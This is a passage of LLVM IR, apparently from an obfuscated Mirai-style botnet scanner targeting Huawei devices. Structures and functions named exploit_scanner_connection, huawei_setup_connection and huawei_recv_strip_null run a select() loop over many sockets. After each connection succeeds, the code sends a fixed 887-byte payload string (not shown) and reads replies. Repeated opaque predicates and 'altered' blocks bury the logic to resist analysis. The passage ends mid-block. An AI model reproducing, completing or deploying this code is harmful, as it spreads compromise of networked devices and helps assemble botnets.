  %956 = load i32, i32* %12, align 4
  %957 = load i32, i32* %11, align 4
  %958 = icmp sgt i32 %956, %957
  %959 = load i32, i32* @x.57
  %960 = load i32, i32* @y.58
  %961 = sub i32 %959, 1
  %962 = mul i32 %959, %961
  %963 = urem i32 %962, 2
  %964 = icmp eq i32 %963, 0
  %965 = icmp slt i32 %960, 10
  %966 = or i1 %964, %965
  br i1 %966, label %originalBBpart2221, label %originalBB219alteredBB

originalBBpart2221:                               ; preds = %originalBB219
  br i1 %958, label %967, label %985

; <label>:967:                                    ; preds = %originalBBpart2221
  %968 = load i32, i32* @x.57
  %969 = load i32, i32* @y.58
  %970 = sub i32 %968, 1
  %971 = mul i32 %968, %970
  %972 = urem i32 %971, 2
  %973 = icmp eq i32 %972, 0
  %974 = icmp slt i32 %969, 10
  %975 = or i1 %973, %974
  br i1 %975, label %originalBB223, label %originalBB223alteredBB

originalBB223:                                    ; preds = %originalBB223alteredBB, %967
  %976 = load i32, i32* %12, align 4
  %977 = load i32, i32* @x.57
  %978 = load i32, i32* @y.58
  %979 = sub i32 %977, 1
  %980 = mul i32 %977, %979
  %981 = urem i32 %980, 2
  %982 = icmp eq i32 %981, 0
  %983 = icmp slt i32 %978, 10
  %984 = or i1 %982, %983
  br i1 %984, label %originalBBpart2225, label %originalBB223alteredBB

originalBBpart2225:                               ; preds = %originalBB223
  br label %1003

; <label>:985:                                    ; preds = %originalBBpart2221
  %986 = load i32, i32* @x.57
  %987 = load i32, i32* @y.58
  %988 = sub i32 %986, 1
  %989 = mul i32 %986, %988
  %990 = urem i32 %989, 2
  %991 = icmp eq i32 %990, 0
  %992 = icmp slt i32 %987, 10
  %993 = or i1 %991, %992
  br i1 %993, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %985
  %994 = load i32, i32* %11, align 4
  %995 = load i32, i32* @x.57
  %996 = load i32, i32* @y.58
  %997 = sub i32 %995, 1
  %998 = mul i32 %995, %997
  %999 = urem i32 %998, 2
  %1000 = icmp eq i32 %999, 0
  %1001 = icmp slt i32 %996, 10
  %1002 = or i1 %1000, %1001
  br i1 %1002, label %originalBBpart2229, label %originalBB227alteredBB

originalBBpart2229:                               ; preds = %originalBB227
  br label %1003

; <label>:1003:                                   ; preds = %originalBBpart2229, %originalBBpart2225
  %1004 = phi i32 [ %976, %originalBBpart2225 ], [ %994, %originalBBpart2229 ]
  %1005 = load i32, i32* @x.57
  %1006 = load i32, i32* @y.58
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBB231, label %originalBB231alteredBB

originalBB231:                                    ; preds = %originalBB231alteredBB, %1003
  %1013 = add nsw i32 1, %1004
  %1014 = call i32 @select(i32 %1013, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %1014, i32* %13, align 4
  %1015 = call i64 @time(i64* null) #6
  %1016 = trunc i64 %1015 to i32
  store i32 %1016, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  %1017 = load i32, i32* @x.57
  %1018 = load i32, i32* @y.58
  %1019 = sub i32 %1017, 1
  %1020 = mul i32 %1017, %1019
  %1021 = urem i32 %1020, 2
  %1022 = icmp eq i32 %1021, 0
  %1023 = icmp slt i32 %1018, 10
  %1024 = or i1 %1022, %1023
  br i1 %1024, label %originalBBpart2238, label %originalBB231alteredBB

originalBBpart2238:                               ; preds = %originalBB231
  br label %1025

; <label>:1025:                                   ; preds = %originalBBpart2337, %originalBBpart2238
  %1026 = load i32, i32* %1, align 4
  %1027 = icmp slt i32 %1026, 128
  br i1 %1027, label %1028, label %1374

; <label>:1028:                                   ; preds = %1025
  %1029 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %1030 = load i32, i32* %1, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1029, i64 %1031
  store %struct.exploit_scanner_connection* %1032, %struct.exploit_scanner_connection** %7, align 8
  %1033 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1034 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1033, i32 0, i32 0
  %1035 = load i32, i32* %1034, align 8
  %1036 = icmp eq i32 %1035, -1
  br i1 %1036, label %1037, label %1038

; <label>:1037:                                   ; preds = %1028
  br label %1355

; <label>:1038:                                   ; preds = %1028
  %1039 = load i32, i32* @x.57
  %1040 = load i32, i32* @y.58
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBB240, label %originalBB240alteredBB

originalBB240:                                    ; preds = %originalBB240alteredBB, %1038
  %1047 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %1048 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1049 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1048, i32 0, i32 0
  %1050 = load i32, i32* %1049, align 8
  %1051 = sdiv i32 %1050, 64
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds [16 x i64], [16 x i64]* %1047, i64 0, i64 %1052
  %1054 = load i64, i64* %1053, align 8
  %1055 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1056 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1055, i32 0, i32 0
  %1057 = load i32, i32* %1056, align 8
  %1058 = srem i32 %1057, 64
  %1059 = zext i32 %1058 to i64
  %1060 = shl i64 1, %1059
  %1061 = and i64 %1054, %1060
  %1062 = icmp ne i64 %1061, 0
  %1063 = load i32, i32* @x.57
  %1064 = load i32, i32* @y.58
  %1065 = sub i32 %1063, 1
  %1066 = mul i32 %1063, %1065
  %1067 = urem i32 %1066, 2
  %1068 = icmp eq i32 %1067, 0
  %1069 = icmp slt i32 %1064, 10
  %1070 = or i1 %1068, %1069
  br i1 %1070, label %originalBBpart2273, label %originalBB240alteredBB

originalBBpart2273:                               ; preds = %originalBB240
  br i1 %1062, label %1071, label %1173

; <label>:1071:                                   ; preds = %originalBBpart2273
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %1072 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1073 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1072, i32 0, i32 0
  %1074 = load i32, i32* %1073, align 8
  %1075 = bitcast i32* %29 to i8*
  %1076 = call i32 @getsockopt(i32 %1074, i32 1, i32 4, i8* %1075, i32* %31) #6
  store i32 %1076, i32* %30, align 4
  %1077 = load i32, i32* %29, align 4
  %1078 = icmp eq i32 %1077, 0
  br i1 %1078, label %1079, label %1163

; <label>:1079:                                   ; preds = %1071
  %1080 = load i32, i32* %30, align 4
  %1081 = icmp eq i32 %1080, 0
  br i1 %1081, label %1082, label %1163

; <label>:1082:                                   ; preds = %1079
  %1083 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1084 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1083, i32 0, i32 2
  %1085 = load i32, i32* %1084, align 8
  %1086 = icmp eq i32 %1085, 3
  br i1 %1086, label %1087, label %1112

; <label>:1087:                                   ; preds = %1082
  %1088 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1089 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1088, i32 0, i32 8
  %1090 = getelementptr inbounds [2560 x i8], [2560 x i8]* %1089, i32 0, i32 0
  %1091 = call i32 @util_strcpy(i8* %1090, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i32 0, i32 0))
  %1092 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1093 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1092, i32 0, i32 0
  %1094 = load i32, i32* %1093, align 8
  %1095 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1096 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1095, i32 0, i32 8
  %1097 = getelementptr inbounds [2560 x i8], [2560 x i8]* %1096, i32 0, i32 0
  %1098 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1099 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1098, i32 0, i32 8
  %1100 = getelementptr inbounds [2560 x i8], [2560 x i8]* %1099, i32 0, i32 0
  %1101 = call i32 @util_strlen(i8* %1100)
  %1102 = sext i32 %1101 to i64
  %1103 = call i64 @send(i32 %1094, i8* %1097, i64 %1102, i32 16384)
  %1104 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1105 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1104, i32 0, i32 8
  %1106 = getelementptr inbounds [2560 x i8], [2560 x i8]* %1105, i32 0, i32 0
  call void @util_zero(i8* %1106, i32 2560)
  %1107 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1108 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1107, i32 0, i32 6
  %1109 = getelementptr inbounds [256 x i8], [256 x i8]* %1108, i32 0, i32 0
  call void @util_zero(i8* %1109, i32 256)
  %1110 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1111 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1110, i32 0, i32 2
  store i32 4, i32* %1111, align 8
  br label %1355

; <label>:1112:                                   ; preds = %1082
  %1113 = load i32, i32* @x.57
  %1114 = load i32, i32* @y.58
  %1115 = sub i32 %1113, 1
  %1116 = mul i32 %1113, %1115
  %1117 = urem i32 %1116, 2
  %1118 = icmp eq i32 %1117, 0
  %1119 = icmp slt i32 %1114, 10
  %1120 = or i1 %1118, %1119
  br i1 %1120, label %originalBB275, label %originalBB275alteredBB

originalBB275:                                    ; preds = %originalBB275alteredBB, %1112
  %1121 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1122 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1121, i32 0, i32 2
  %1123 = load i32, i32* %1122, align 8
  %1124 = icmp eq i32 %1123, 4
  %1125 = load i32, i32* @x.57
  %1126 = load i32, i32* @y.58
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBBpart2277, label %originalBB275alteredBB

originalBBpart2277:                               ; preds = %originalBB275
  br i1 %1124, label %1133, label %1158

; <label>:1133:                                   ; preds = %originalBBpart2277
  %1134 = load i32, i32* @x.57
  %1135 = load i32, i32* @y.58
  %1136 = sub i32 %1134, 1
  %1137 = mul i32 %1134, %1136
  %1138 = urem i32 %1137, 2
  %1139 = icmp eq i32 %1138, 0
  %1140 = icmp slt i32 %1135, 10
  %1141 = or i1 %1139, %1140
  br i1 %1141, label %originalBB279, label %originalBB279alteredBB

originalBB279:                                    ; preds = %originalBB279alteredBB, %1133
  %1142 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1143 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1142, i32 0, i32 0
  %1144 = load i32, i32* %1143, align 8
  %1145 = call i32 @close(i32 %1144)
  %1146 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1147 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1146, i32 0, i32 0
  store i32 -1, i32* %1147, align 8
  %1148 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1149 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1148, i32 0, i32 2
  store i32 0, i32* %1149, align 8
  %1150 = load i32, i32* @x.57
  %1151 = load i32, i32* @y.58
  %1152 = sub i32 %1150, 1
  %1153 = mul i32 %1150, %1152
  %1154 = urem i32 %1153, 2
  %1155 = icmp eq i32 %1154, 0
  %1156 = icmp slt i32 %1151, 10
  %1157 = or i1 %1155, %1156
  br i1 %1157, label %originalBBpart2281, label %originalBB279alteredBB

originalBBpart2281:                               ; preds = %originalBB279
  br label %1355

; <label>:1158:                                   ; preds = %originalBBpart2277
  %1159 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1160 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1159, i32 0, i32 2
  store i32 3, i32* %1160, align 8
  br label %1161

; <label>:1161:                                   ; preds = %1158
  br label %1162

; <label>:1162:                                   ; preds = %1161
  br label %1172

; <label>:1163:                                   ; preds = %1079, %1071
  %1164 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1165 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1164, i32 0, i32 0
  %1166 = load i32, i32* %1165, align 8
  %1167 = call i32 @close(i32 %1166)
  %1168 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1169 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1168, i32 0, i32 0
  store i32 -1, i32* %1169, align 8
  %1170 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1171 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1170, i32 0, i32 2
  store i32 0, i32* %1171, align 8
  br label %1355

; <label>:1172:                                   ; preds = %1162
  br label %1173

; <label>:1173:                                   ; preds = %1172, %originalBBpart2273
  %1174 = load i32, i32* @x.57
  %1175 = load i32, i32* @y.58
  %1176 = sub i32 %1174, 1
  %1177 = mul i32 %1174, %1176
  %1178 = urem i32 %1177, 2
  %1179 = icmp eq i32 %1178, 0
  %1180 = icmp slt i32 %1175, 10
  %1181 = or i1 %1179, %1180
  br i1 %1181, label %originalBB283, label %originalBB283alteredBB

originalBB283:                                    ; preds = %originalBB283alteredBB, %1173
  %1182 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %1183 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1184 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1183, i32 0, i32 0
  %1185 = load i32, i32* %1184, align 8
  %1186 = sdiv i32 %1185, 64
  %1187 = sext i32 %1186 to i64
  %1188 = getelementptr inbounds [16 x i64], [16 x i64]* %1182, i64 0, i64 %1187
  %1189 = load i64, i64* %1188, align 8
  %1190 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1191 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1190, i32 0, i32 0
  %1192 = load i32, i32* %1191, align 8
  %1193 = srem i32 %1192, 64
  %1194 = zext i32 %1193 to i64
  %1195 = shl i64 1, %1194
  %1196 = and i64 %1189, %1195
  %1197 = icmp ne i64 %1196, 0
  %1198 = load i32, i32* @x.57
  %1199 = load i32, i32* @y.58
  %1200 = sub i32 %1198, 1
  %1201 = mul i32 %1198, %1200
  %1202 = urem i32 %1201, 2
  %1203 = icmp eq i32 %1202, 0
  %1204 = icmp slt i32 %1199, 10
  %1205 = or i1 %1203, %1204
  br i1 %1205, label %originalBBpart2310, label %originalBB283alteredBB

originalBBpart2310:                               ; preds = %originalBB283
  br i1 %1197, label %1206, label %1354

; <label>:1206:                                   ; preds = %originalBBpart2310
  br label %1207

; <label>:1207:                                   ; preds = %1335, %1316, %1206
  %1208 = load i32, i32* @x.57
  %1209 = load i32, i32* @y.58
  %1210 = sub i32 %1208, 1
  %1211 = mul i32 %1208, %1210
  %1212 = urem i32 %1211, 2
  %1213 = icmp eq i32 %1212, 0
  %1214 = icmp slt i32 %1209, 10
  %1215 = or i1 %1213, %1214
  br i1 %1215, label %originalBB312, label %originalBB312alteredBB

originalBB312:                                    ; preds = %originalBB312alteredBB, %1207
  store i32 0, i32* %32, align 4
  %1216 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1217 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1216, i32 0, i32 2
  %1218 = load i32, i32* %1217, align 8
  %1219 = icmp eq i32 %1218, 0
  %1220 = load i32, i32* @x.57
  %1221 = load i32, i32* @y.58
  %1222 = sub i32 %1220, 1
  %1223 = mul i32 %1220, %1222
  %1224 = urem i32 %1223, 2
  %1225 = icmp eq i32 %1224, 0
  %1226 = icmp slt i32 %1221, 10
  %1227 = or i1 %1225, %1226
  br i1 %1227, label %originalBBpart2314, label %originalBB312alteredBB

originalBBpart2314:                               ; preds = %originalBB312
  br i1 %1219, label %1228, label %1245

; <label>:1228:                                   ; preds = %originalBBpart2314
  %1229 = load i32, i32* @x.57
  %1230 = load i32, i32* @y.58
  %1231 = sub i32 %1229, 1
  %1232 = mul i32 %1229, %1231
  %1233 = urem i32 %1232, 2
  %1234 = icmp eq i32 %1233, 0
  %1235 = icmp slt i32 %1230, 10
  %1236 = or i1 %1234, %1235
  br i1 %1236, label %originalBB316, label %originalBB316alteredBB

originalBB316:                                    ; preds = %originalBB316alteredBB, %1228
  %1237 = load i32, i32* @x.57
  %1238 = load i32, i32* @y.58
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBBpart2318, label %originalBB316alteredBB

originalBBpart2318:                               ; preds = %originalBB316
  br label %1353

; <label>:1245:                                   ; preds = %originalBBpart2314
  %1246 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1247 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1246, i32 0, i32 5
  %1248 = load i32, i32* %1247, align 4
  %1249 = icmp eq i32 %1248, 256
  br i1 %1249, label %1250, label %1262

; <label>:1250:                                   ; preds = %1245
  %1251 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1252 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1251, i32 0, i32 6
  %1253 = getelementptr inbounds [256 x i8], [256 x i8]* %1252, i32 0, i32 0
  %1254 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1255 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1254, i32 0, i32 6
  %1256 = getelementptr inbounds [256 x i8], [256 x i8]* %1255, i32 0, i32 0
  %1257 = getelementptr inbounds i8, i8* %1256, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1253, i8* %1257, i64 192, i32 1, i1 false)
  %1258 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1259 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1258, i32 0, i32 5
  %1260 = load i32, i32* %1259, align 4
  %1261 = sub nsw i32 %1260, 64
  store i32 %1261, i32* %1259, align 4
  br label %1262

; <label>:1262:                                   ; preds = %1250, %1245
  %1263 = call i32* @__errno_location() #9
  store i32 0, i32* %1263, align 4
  %1264 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1265 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1264, i32 0, i32 0
  %1266 = load i32, i32* %1265, align 8
  %1267 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1268 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1267, i32 0, i32 6
  %1269 = getelementptr inbounds [256 x i8], [256 x i8]* %1268, i32 0, i32 0
  %1270 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1271 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1270, i32 0, i32 5
  %1272 = load i32, i32* %1271, align 4
  %1273 = sext i32 %1272 to i64
  %1274 = getelementptr inbounds i8, i8* %1269, i64 %1273
  %1275 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1276 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1275, i32 0, i32 5
  %1277 = load i32, i32* %1276, align 4
  %1278 = sub nsw i32 256, %1277
  %1279 = call i32 @huawei_recv_strip_null(i32 %1266, i8* %1274, i32 %1278, i32 16384)
  store i32 %1279, i32* %32, align 4
  %1280 = load i32, i32* %32, align 4
  %1281 = icmp eq i32 %1280, 0
  br i1 %1281, label %1282, label %1284

; <label>:1282:                                   ; preds = %1262
  %1283 = call i32* @__errno_location() #9
  store i32 104, i32* %1283, align 4
  store i32 -1, i32* %32, align 4
  br label %1284

; <label>:1284:                                   ; preds = %1282, %1262
  %1285 = load i32, i32* @x.57
  %1286 = load i32, i32* @y.58
  %1287 = sub i32 %1285, 1
  %1288 = mul i32 %1285, %1287
  %1289 = urem i32 %1288, 2
  %1290 = icmp eq i32 %1289, 0
  %1291 = icmp slt i32 %1286, 10
  %1292 = or i1 %1290, %1291
  br i1 %1292, label %originalBB320, label %originalBB320alteredBB

originalBB320:                                    ; preds = %originalBB320alteredBB, %1284
  %1293 = load i32, i32* %32, align 4
  %1294 = icmp eq i32 %1293, -1
  %1295 = load i32, i32* @x.57
  %1296 = load i32, i32* @y.58
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBBpart2322, label %originalBB320alteredBB

originalBBpart2322:                               ; preds = %originalBB320
  br i1 %1294, label %1303, label %1335

; <label>:1303:                                   ; preds = %originalBBpart2322
  %1304 = call i32* @__errno_location() #9
  %1305 = load i32, i32* %1304, align 4
  %1306 = icmp ne i32 %1305, 11
  br i1 %1306, label %1307, label %1334

; <label>:1307:                                   ; preds = %1303
  %1308 = call i32* @__errno_location() #9
  %1309 = load i32, i32* %1308, align 4
  %1310 = icmp ne i32 %1309, 11
  br i1 %1310, label %1311, label %1334

; <label>:1311:                                   ; preds = %1307
  %1312 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1313 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1312, i32 0, i32 2
  %1314 = load i32, i32* %1313, align 8
  %1315 = icmp eq i32 %1314, 3
  br i1 %1315, label %1316, label %1322

; <label>:1316:                                   ; preds = %1311
  %1317 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1318 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1317, i32 0, i32 0
  %1319 = load i32, i32* %1318, align 8
  %1320 = call i32 @close(i32 %1319)
  %1321 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %1321)
  br label %1207

; <label>:1322:                                   ; preds = %1311
  %1323 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1324 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1323, i32 0, i32 0
  %1325 = load i32, i32* %1324, align 8
  %1326 = call i32 @close(i32 %1325)
  %1327 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1328 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1327, i32 0, i32 0
  store i32 -1, i32* %1328, align 8
  %1329 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1330 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1329, i32 0, i32 2
  store i32 0, i32* %1330, align 8
  %1331 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1332 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1331, i32 0, i32 6
  %1333 = getelementptr inbounds [256 x i8], [256 x i8]* %1332, i32 0, i32 0
  call void @util_zero(i8* %1333, i32 256)
  br label %1334

; <label>:1334:                                   ; preds = %1322, %1307, %1303
  br label %1353

; <label>:1335:                                   ; preds = %originalBBpart2322
  %1336 = load i32, i32* %32, align 4
  %1337 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1338 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1337, i32 0, i32 5
  %1339 = load i32, i32* %1338, align 4
  %1340 = add nsw i32 %1339, %1336
  store i32 %1340, i32* %1338, align 4
  %1341 = load i32, i32* @huawei_fake_time, align 4
  %1342 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1343 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1342, i32 0, i32 1
  store i32 %1341, i32* %1343, align 4
  %1344 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1345 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1344, i32 0, i32 6
  %1346 = getelementptr inbounds [256 x i8], [256 x i8]* %1345, i32 0, i32 0
  %1347 = call i32 @util_strlen(i8* %1346)
  store i32 %1347, i32* %33, align 4
  %1348 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1349 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1348, i32 0, i32 6
  %1350 = load i32, i32* %33, align 4
  %1351 = sext i32 %1350 to i64
  %1352 = getelementptr inbounds [256 x i8], [256 x i8]* %1349, i64 0, i64 %1351
  store i8 0, i8* %1352, align 1
  br label %1207

; <label>:1353:                                   ; preds = %1334, %originalBBpart2318
  br label %1354

; <label>:1354:                                   ; preds = %1353, %originalBBpart2310
  br label %1355

; <label>:1355:                                   ; preds = %1354, %1163, %originalBBpart2281, %1087, %1037
  %1356 = load i32, i32* @x.57
  %1357 = load i32, i32* @y.58
  %1358 = sub i32 %1356, 1
  %1359 = mul i32 %1356, %1358
  %1360 = urem i32 %1359, 2
  %1361 = icmp eq i32 %1360, 0
  %1362 = icmp slt i32 %1357, 10
  %1363 = or i1 %1361, %1362
  br i1 %1363, label %originalBB324, label %originalBB324alteredBB

originalBB324:                                    ; preds = %originalBB324alteredBB, %1355
  %1364 = load i32, i32* %1, align 4
  %1365 = add nsw i32 %1364, 1
  store i32 %1365, i32* %1, align 4
  %1366 = load i32, i32* @x.57
  %1367 = load i32, i32* @y.58
  %1368 = sub i32 %1366, 1
  %1369 = mul i32 %1366, %1368
  %1370 = urem i32 %1369, 2
  %1371 = icmp eq i32 %1370, 0
  %1372 = icmp slt i32 %1367, 10
  %1373 = or i1 %1371, %1372
  br i1 %1373, label %originalBBpart2337, label %originalBB324alteredBB

originalBBpart2337:                               ; preds = %originalBB324
  br label %1025

; <label>:1374:                                   ; preds = %1025
  br label %217

originalBBalteredBB:                              ; preds = %originalBB, %50
  %1375 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %1376 = load i32, i32* %1, align 4
  %1377 = sext i32 %1376 to i64
  %1378 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1375, i64 %1377
  %1379 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1378, i32 0, i32 2
  store i32 0, i32* %1379, align 8
  %1380 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %1381 = load i32, i32* %1, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1380, i64 %1382
  %1384 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1383, i32 0, i32 0
  store i32 -1, i32* %1384, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %94
  %1385 = load i32, i32* @huawei_rsck, align 4
  %1386 = call i32 @close(i32 %1385)
  call void @exit(i32 0) #12
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %114
  %1387 = call i32 @rand_next()
  %_ = sub i32 0, %1387
  %gen = add i32 %_, 65535
  %_7 = sub i32 0, %1387
  %gen8 = add i32 %_7, 65535
  %_9 = shl i32 %1387, 65535
  %_10 = sub i32 %1387, 65535
  %gen11 = mul i32 %_10, 65535
  %_12 = shl i32 %1387, 65535
  %1388 = and i32 %1387, 65535
  %1389 = trunc i32 %1388 to i16
  store i16 %1389, i16* %2, align 2
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %134
  %1390 = load i16, i16* %2, align 2
